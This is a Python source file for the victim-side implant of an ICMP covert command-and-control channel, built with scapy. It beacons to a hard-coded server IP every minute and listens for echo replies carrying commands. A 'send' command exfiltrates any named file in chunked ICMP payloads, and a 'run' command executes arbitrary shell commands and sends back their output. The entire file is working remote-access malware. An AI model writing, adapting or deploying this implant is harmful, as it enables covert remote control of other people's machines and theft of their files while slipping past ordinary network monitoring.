import signal
import os
import time
import threading
import netifaces
from subprocess import *

try:
    import netifaces
except ImportError:
    """
    Attempts to import netifaces module. If it's not found, installs it and then imports the module.
    """
    Popen([sys.executable, "-m", "pip", "install", "netifaces"])
    import netifaces

try:
    from scapy.all import *
except ImportError:
    """
    Attempts to import scapy module. If it's not found, installs it and then imports the module.
    """
    Popen([sys.executable, "-m", "pip", "install", "scapy"])
    from scapy.all import *
    
    
class Victim:
    """
    Represents the victim machine.
    """
    

    def __init__(self):
        """
        Initializes the Victim class with default settings.
        """
        self.SERVER_IP = "192.168.2.109"
        self.INTERFACE = None
        self.TRANSPORT_UNIT = 1000
        self.ECHO_REPLY = "icmp[0]=0"

    def start(self):
        """
        Starts the Victim's main functionality including sending beacons and packet sniffing.
        """
        signal.signal(signal.SIGINT, self.signal_handler)

        send_thread = threading.Thread(target=self.send_beacon_thread)
        send_thread.start()

        self.INTERFACE = self.get_interface()

        sniff(iface=self.INTERFACE, filter=self.ECHO_REPLY, prn=self.handle_packet, store=False)

    def signal_handler(self, sig, frame):
        """
        Handles the SIGINT signal (Ctrl+C).
        """
        print(' Exiting...')
        sys.exit(0)

    def send_packet(self, payload, packet):
        """
        Sends an ICMP echo-request packet with a payload to the server.
        
        Args:
            payload: Payload to be sent.
            packet : Original packet for context.
        """
        send(IP(dst=self.SERVER_IP)/ICMP(type="echo-request", id=packet[ICMP].id)/Raw(load=payload))

    def fragmentation(self, result, prefix, packet):
        """
        Fragments the result into smaller chunks and sends them.
        
        Args:
            result: Result to be fragmented.
            prefix: Prefix to be added to each fragment.
            packet: Original packet for context.
        """
        for chunk in range(0, len(result), self.TRANSPORT_UNIT):
            x = chunk
            self.send_packet(prefix + result[x:x+self.TRANSPORT_UNIT], packet)

    def parse_and_execute(self, payload, packet):
        """
        Parses and executes the received payload command from the server.
        
        Args:
            payload: Payload received from the server.
            packet : Received packet.
        """
        if payload.startswith("send"):
            file_name = payload[5:]
            if os.path.exists(file_name):
                with open(file_name, "rb") as file1:
                    file_content = file1.read()
                    self.fragmentation(file_content, file_name.encode(), packet)
            else:
                self.send_packet(f"File not found: {file_name}", packet)

        elif payload.startswith("run"):
            result = Popen(payload[4:], shell=True, stdout=PIPE, stderr=PIPE)
            stdout, stderr = result.communicate()
            exit_code = result.returncode
            result = "stdout: {}\nstrerr: {}\nexit code: {}".format(stdout.decode("utf-8"), stderr.decode("utf-8"), exit_code)
            if len(result) > self.TRANSPORT_UNIT:
                self.fragmentation(result, '', packet)
            else:
                self.send_packet(result, packet)

    def handle_packet(self, packet):
        """
        Handles the received packet.
        
        Args:
            packet: Received packet.
        """
        try:
            payload = packet[0][Raw].load.decode('utf-8')
        except:
            print("Something went wrong while handling the packet")
            return
        self.parse_and_execute(payload, packet)

    def send_beacon_thread(self):
        """
        Continuously sends beacons to the server.
        """
        while True:
            send(IP(dst=self.SERVER_IP)/ICMP(type="echo-request", id=0x001)/Raw(load="Hey server."))
            time.sleep(60)

    def get_interface(self):
        """
        Gets the default interface of the victim machine.
        
        Returns:
            interface: Default interface's name.
        """
        default_gw = netifaces.gateways().get("default", {}).get(netifaces.AF_INET)
        if default_gw:
            interface = default_gw[1]
            return interface
        else:
            sys.exit(1)

if __name__ == "__main__":
    victim = Victim()
    victim.start()

